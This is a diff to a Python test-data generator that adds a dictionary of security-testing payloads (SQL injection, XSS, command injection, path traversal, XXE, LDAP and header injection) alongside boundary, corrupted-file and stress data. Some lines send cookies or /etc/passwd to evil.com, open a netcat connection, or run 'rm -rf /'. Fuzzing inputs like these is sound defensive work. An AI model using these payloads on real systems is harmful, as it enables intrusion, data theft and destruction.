@@ -293,6 +293,192 @@ class TestDataGenerator:
         ]
     
     @staticmethod
+    def malicious_payloads() -> Dict[str, List[str]]:
+        """Generate various malicious payloads for security testing."""
+        return {
+            'sql_injection': [
+                "'; DROP TABLE users; --",
+                "1' OR '1'='1",
+                "' UNION SELECT * FROM users--",
+                "admin'--",
+                "' OR 1=1--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "' OR EXISTS(SELECT * FROM users WHERE username='admin') AND ''='",
+                "'; EXEC xp_cmdshell('dir'); --",
+                "' UNION ALL SELECT NULL,NULL,NULL--",
+                "' AND 1=(SELECT COUNT(*) FROM tabname); --",
+            ],
+            'xss': [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+                "<body onload=alert('XSS')>",
+                "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+                "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
+                "';alert(String.fromCharCode(88,83,83))//",
+                "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
+            ],
+            'command_injection': [
+                "$(whoami)",
+                "`id`",
+                "; ls -la /",
+                "| cat /etc/passwd",
+                "&& rm -rf /",
+                "|| curl evil.com",
+                "$(curl -X POST evil.com -d @/etc/passwd)",
+                "`python -c 'import os; os.system(\"ls\")'`",
+                "\n/bin/bash\n",
+                "| nc evil.com 1234",
+            ],
+            'path_traversal': [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\config\\sam",
+                "....//....//....//etc/passwd",
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "..%252f..%252f..%252fetc%252fpasswd",
+                "..;/etc/passwd",
+                "../../../../../../../../../etc/passwd",
+                "file:///etc/passwd",
+                "\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
+                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            ],
+            'xxe': [
+                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
+                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
+            ],
+            'ldap_injection': [
+                "*",
+                "*)(&",
+                "*)(uid=*",
+                "*)(|(uid=*",
+                "admin)(&(",
+                "*)(objectClass=*",
+                "*)(|(objectClass=*",
+            ],
+            'header_injection': [
+                "value\r\nX-Injected: true",
+                "value\nSet-Cookie: admin=true",
+                "value\r\n\r\n<html>",
+                "value%0d%0aSet-Cookie:%20admin=true",
+            ],
+            'unicode_edge_cases': [
+                "\u0000",  # Null
+                "\ufeff",  # BOM
+                "\u200b\u200c\u200d",  # Zero-width
+                "\u0301" * 100,  # Combining marks
+                "\uffff",  # Noncharacter
+                "\U0001f4a9",  # Emoji
+                "\u202e",  # RTL override
+                "\ud800",  # Surrogate half
+            ],
+        }
+    
+    @staticmethod
+    def boundary_values() -> Dict[str, Any]:
+        """Generate boundary test values."""
+        return {
+            'integers': {
+                'max_int32': 2147483647,
+                'min_int32': -2147483648,
+                'overflow_int32': 2147483648,
+                'max_int64': 9223372036854775807,
+                'min_int64': -9223372036854775808,
+                'zero': 0,
+                'negative_zero': -0,
+            },
+            'floats': {
+                'infinity': float('inf'),
+                'neg_infinity': float('-inf'),
+                'nan': float('nan'),
+                'max_float': 3.4028235e+38,
+                'min_float': -3.4028235e+38,
+                'epsilon': 2.220446049250313e-16,
+            },
+            'strings': {
+                'empty': '',
+                'single_space': ' ',
+                'null_byte': '\x00',
+                'very_long': 'x' * 1000000,
+                'unicode_max': '\U0010FFFF',
+                'all_whitespace': '   \t\n\r   ',
+            },
+            'arrays': {
+                'empty': [],
+                'nested_empty': [[], [], []],
+                'deeply_nested': [[[[[[[[[[[]]]]]]]]]]], 
+                'very_large': list(range(100000)),
+            },
+            'objects': {
+                'empty': {},
+                'null_values': {'a': None, 'b': None},
+                'recursive': None,  # Set up recursively in code
+                'very_deep': None,  # Set up with deep nesting in code
+            }
+        }
+    
+    @staticmethod
+    def generate_corrupted_file_data() -> Dict[str, bytes]:
+        """Generate corrupted file data for various formats."""
+        return {
+            'pdf': b'%PDF-1.CORRUPTED\x00\x00',
+            'mp3': b'\xFF\xFF\xFF\xFF',  # Invalid MP3 frame
+            'mp4': b'ftypCORRUPTED',  # Invalid MP4 header
+            'jpg': b'\xFF\xD8\xFF\x00CORRUPTED',  # Invalid JPEG
+            'png': b'\x89PNG\x0D\x0A\x00\x00',  # Truncated PNG
+            'zip': b'XX\x00\x00',  # Invalid ZIP
+            'docx': b'PK\x00\x00CORRUPTED',  # Invalid DOCX (ZIP-based)
+            'wav': b'RIFF\x00\x00\x00\x00CORRUPTED',  # Invalid WAV
+            'json': b'{"corrupted: true, invalid json}',  # Malformed JSON
+            'xml': b'<root><unclosed>',  # Malformed XML
+        }
+    
+    @staticmethod
+    def generate_stress_test_data() -> Dict[str, Any]:
+        """Generate data for stress testing."""
+        return {
+            'large_text': 'x' * (10 * 1024 * 1024),  # 10MB string
+            'deep_nesting': {'a' * i: {'b' * i: None} for i in range(1000)},
+            'many_fields': {f'field_{i}': f'value_{i}' for i in range(10000)},
+            'unicode_stress': ''.join(chr(i) for i in range(0x1F600, 0x1F650)) * 1000,
+            'binary_data': bytes(random.randint(0, 255) for _ in range(1024 * 1024)),
+        }
+    
+    @staticmethod
+    def generate_test_user() -> Dict[str, str]:
+        """Generate a test user with edge case variations."""
+        variations = [
+            # Normal user
+            {
+                "username": f"user_{TestDataGenerator.random_string(8)}",
+                "email": f"test_{TestDataGenerator.random_string(8)}@example.com",
+                "password": "TestPassword123!"
+            },
+            # Unicode username
+            {
+                "username": f"用户_{TestDataGenerator.random_string(4)}",
+                "email": f"test_{TestDataGenerator.random_string(8)}@example.com",
+                "password": "TestPassword123!"
+            },
+            # Special chars in email
+            {
+                "username": f"user_{TestDataGenerator.random_string(8)}",
+                "email": f"test+{TestDataGenerator.random_string(4)}@sub.example.com",
+                "password": "TestPassword123!"
+            },
+            # Long password
+            {
+                "username": f"user_{TestDataGenerator.random_string(8)}",
+                "email": f"test_{TestDataGenerator.random_string(8)}@example.com",
+                "password": "A" * 100 + "1!",
+            },
+        ]
+        
+        return random.choice(variations)
+    
+    @staticmethod
     def generate_test_batch(count: int = 5) -> List[Dict[str, Any]]:
         """Generate a batch of test items."""
         batch = []
